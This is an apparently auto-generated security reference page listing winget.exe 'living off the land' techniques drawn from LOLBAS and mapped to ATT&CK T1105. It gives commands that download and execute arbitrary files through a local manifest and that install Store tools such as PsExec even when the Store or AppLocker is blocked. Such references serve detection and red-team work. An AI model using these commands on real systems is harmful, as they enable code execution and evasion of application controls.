---
parsed_by: focuslocust
source: commands
type: generated
---
# winget Commands

[Home](../../../README.md)

> This page contains security testing commands. Use only in authorised environments.

## winget.exe

Tool page: [winget.exe](../../tools/windows/winget.exe.md)

### Download and execute an arbitrary file from the internet

```text
winget.exe install --manifest {PATH:.yml}
```

Description:

Downloads a file from the web address specified in .yml file and executes it on the system. Local manifest setting must be enabled in winget for it to work: `winget settings --enable LocalManifestFiles`

Related ATT&CK:

- [T1105](../../attack/techniques/T1105-ingress-tool-transfer.md)

Provenance:

| Field | Value |
| --- | --- |
| Source | `lolbas` |
| Source file | `/home/adams/scorchederf/focuslocust/.cache/lolbas/yml/OSBinaries/Winget.yml` |
| Evidence | Command preserved from source parser. |

### Download and install software from Microsoft Store, even if Microsoft Store App is blocked

```text
winget.exe install --accept-package-agreements -s msstore {name or ID}
```

Description:

Download and install any software from the Microsoft Store using its name or Store ID, even if the Microsoft Store App itself is blocked on the machine. For example, use "Sysinternals Suite" or `9p7knl5rwt25` for obtaining ProcDump, PsExec via the Sysinternals Suite. Note: a Microsoft account is required for this.

Related ATT&CK:

- [T1105](../../attack/techniques/T1105-ingress-tool-transfer.md)

Provenance:

| Field | Value |
| --- | --- |
| Source | `lolbas` |
| Source file | `/home/adams/scorchederf/focuslocust/.cache/lolbas/yml/OSBinaries/Winget.yml` |
| Evidence | Command preserved from source parser. |

### Download and install software from Microsoft Store, even if Microsoft Store App is blocked, and AppLocker is activated on the machine

```text
winget.exe install --accept-package-agreements -s msstore {name or ID}
```

Description:

Download and install any software from the Microsoft Store using its name or Store ID, even if the Microsoft Store App itself is blocked on the machine, and even if AppLocker is active on the machine. For example, use "Sysinternals Suite" or `9p7knl5rwt25` for obtaining ProcDump, PsExec via the Sysinternals Suite. Note: a Microsoft account is required for this.

Related ATT&CK:

- [T1105](../../attack/techniques/T1105-ingress-tool-transfer.md)

Provenance:

| Field | Value |
| --- | --- |
| Source | `lolbas` |
| Source file | `/home/adams/scorchederf/focuslocust/.cache/lolbas/yml/OSBinaries/Winget.yml` |
| Evidence | Command preserved from source parser. |
